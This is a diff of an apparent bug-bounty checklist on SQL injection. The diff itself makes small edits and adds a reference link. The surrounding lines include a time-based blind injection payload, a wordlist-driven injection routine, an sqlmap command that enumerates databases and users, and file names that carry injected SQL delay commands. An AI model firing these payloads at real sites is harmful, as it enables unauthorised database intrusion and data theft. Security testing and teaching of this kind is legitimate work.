@@ -30,8 +30,8 @@ orwa' AND (SELECT 6377 FROM (SELECT(SLEEP(5)))hLTl)--
 
 ### How To Test?
 
- 1) Use this [wordlist](https://raw.githubusercontent.com/0xmaximus/Galaxy-Bugbounty-Checklist/main/SQL%20injection/SQL.txt) with intruder and inject all payloads in relative parameters and headers(User-Agent, Cookies, Referer and ...)  
- 2) After you got DELAY save request in txt file and use sqlmap for confirm and exploit vulnerability
+ 1) Use this [wordlist](https://raw.githubusercontent.com/0xmaximus/Galaxy-Bugbounty-Checklist/main/SQL%20injection/SQL.txt) with intruder and inject all payloads in relative parameters and headers(User-Agent, Cookies, Referer, x-requested-with and ...)  
+ 2) After you got DELAY, save request in txt file and use sqlmap for confirm and exploit vulnerability
 
 ```
 sqlmap -r request.txt -p parameter-name --force-ssl --level 5 --risk 3  --dbs --hostname --current-user
@@ -53,3 +53,6 @@ Save file with this names and upload it in site
 --sleep(5*7).png
 pic.png;waitfor delay '0:0:5'-- 
 ```
+
+Refrences:
+https://twitter.com/GodfatherOrwa
